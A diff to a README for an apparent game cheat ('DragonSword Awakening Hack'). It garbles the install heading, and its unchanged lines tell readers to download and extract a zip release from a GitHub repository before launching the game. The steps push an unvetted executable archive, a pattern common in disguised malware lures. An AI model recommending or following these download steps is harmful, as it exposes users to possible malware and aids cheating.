@@ -65,7 +65,7 @@ Check the Features list below.
 
 ---
 
-## How to Install
+## How do I use itttt
 1. Download the [latest release build](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack-V1/releases/download/v1.3/DSAW-V1.zip) from repo's Releases page.
 2. Extract the contents to any folder (e.g., `C:\DragonSwordtoolssss`).
 3. Launch game.
